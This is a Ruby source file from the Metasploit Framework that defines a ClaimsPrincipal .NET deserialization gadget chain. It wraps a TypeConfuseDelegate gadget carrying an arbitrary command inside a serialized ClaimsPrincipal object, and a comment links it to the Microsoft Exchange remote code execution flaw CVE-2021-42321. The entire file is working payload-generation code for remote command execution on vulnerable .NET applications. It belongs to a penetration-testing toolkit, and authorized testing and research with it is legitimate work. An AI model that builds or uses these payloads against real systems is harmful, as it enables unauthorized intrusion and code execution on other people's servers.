module Msf
module Util
module DotNetDeserialization
module GadgetChains

  class ClaimsPrincipal < Types::SerializedStream

    # ClaimsPrincipal
    #   Credits:
    #     Finders: jang
    #     Contributors: jang
    #   References:
    #     https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852

    def self.generate(cmd)
      inner = GadgetChains::TypeConfuseDelegate.generate(cmd)

      self.from_values([
        Types::RecordValues::SerializationHeaderRecord.new(root_id: 1, header_id: -1),
        Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(
          class_info: Types::General::ClassInfo.new(
            obj_id: 1,
            name: 'System.Security.Claims.ClaimsPrincipal',
            member_names: %w{ m_serializedClaimsIdentities }
          ),
          member_type_info: Types::General::MemberTypeInfo.new(
            binary_type_enums: %i{ String },
          ),
          member_values: [
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
              obj_id: 5,
              string: Rex::Text.encode_base64(inner.to_binary_s)
            ))
          ]
        ),
        Types::RecordValues::MessageEnd.new
      ])
    end

  end

end
end
end
end
